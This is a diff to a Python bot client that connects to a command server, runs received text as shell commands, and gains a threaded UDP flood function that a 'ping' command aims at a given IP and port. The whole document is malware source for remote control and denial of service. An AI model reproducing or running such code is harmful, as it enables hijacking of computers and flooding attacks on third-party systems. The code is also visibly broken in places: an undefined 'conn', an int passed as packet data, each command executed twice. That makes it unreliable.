@@ -1,4 +1,4 @@
-import socket, time, os
+import socket, time, os, threading
 
 #toggle dev mode
 verbose = True
@@ -6,7 +6,7 @@ verbose = True
 
 addr = ('127.0.0.1', 5002)
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+stop = True
 def init():
         while True:
                 try:
@@ -22,6 +22,25 @@ def init():
                         
         main()
 
+def udpflood(ip, port):
+        global stop
+        stop = False
+        while True:
+                if stop == True:
+                        sock.close()
+                        break
+                        
+                sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                try:
+                        sock.sendto(623,(ip,int(port)))
+                except:
+                        sock.close
+        
+
+
+
+
+
 def main():
         shellmode = False
         if verbose:
@@ -29,20 +48,34 @@ def main():
         while True:
                 msg = None
                 msg = client.recv(1024)
+                decoded = msg.decode('utf-8')
                 if msg:
-                    print('command recieved:', msg.decode('utf-8'))
+                    print('command recieved:', decoded)
                     if shellmode == True:
-                            if msg == 'stop':
+                            if 'stop' in decoded:
                                     shellmode = False
                             else:
                                     time.sleep(1)
-                                    output_stream = os.popen(msg.decode('utf-8'))
-                                    output = output_stream.read()
-                                    client.send(output.encode('utf-8'))
+                                    output_stream = os.popen(decoded)
+                                    if os.system(decoded) != 0:
+                                            client.send('Invalid Command'.encode('utf-8'))
+                                    else:
+                                            output = output_stream.read()
+                                            if output:
+                                                    client.send(output.encode('utf-8'))
+                                            else:
+                                                    client.send('empty output'.encode('utf-8'))
                             
                     else:
-                            if msg.decode('utf-8') == 'shell':
+                            if decoded == 'shell':
                                     shellmode = True
+                            if 'noping' in decoded:
+                                    stop = True
+                            if 'ping' in decoded:
+                                    hostname = conn.recv(1024).decode('utf-8')
+                                    port = conn.recv(1024)
+                                    t1 = threading.Thread(target=udpflood, args=(hostname, port))
+                                    t1.start()
                             
                             time.sleep(1)
                             
